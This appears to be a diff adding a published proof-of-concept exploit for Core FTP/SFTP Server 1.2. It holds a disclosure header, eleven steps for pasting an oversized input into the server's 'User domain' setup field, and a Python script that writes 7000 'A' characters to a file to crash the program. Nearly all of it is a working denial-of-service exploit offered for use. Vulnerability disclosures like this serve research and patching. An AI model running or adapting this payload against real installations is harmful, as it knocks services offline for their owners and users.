@@ -1,0 +1,26 @@
+#Exploit Title: Core FTP/SFTP Server 1.2 - Build 589.42 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-02-13
+#Vendor Homepage: http://www.coreftp.com/
+#Software Link: http://www.coreftp.com/server/download/archive/CoreFTPServer589.42.exe
+#Tested Version: v2-Build 673
+#Tested on: Windows 7 Service Pack 1 x32
+
+#Steps to produce the crash:
+#1.- Run python code: Core_FTP_SFTP_Server_1.2.py
+#2.- Open core_code.txt and copy content to clipboard
+#3.- Open Core FTP Server
+#4.- Select "Setup" > "New"
+#5.- Select "Domain Name" and Put "Test"
+#6.- Select "Domain IP/Address" and Put "1.1.1.1" 
+#7.- Select "Base directory" and Choose a directory path
+#8.- Enable "WinNT users" 
+#9.- Select "User domain" and Paste Clipboard
+#10.- Click on "Ok" and the next window click "Ok"
+#11.- Crashed
+
+cod = "\x41" * 7000
+
+f = open('core_code.txt', 'w')
+f.write(cod)
+f.close()
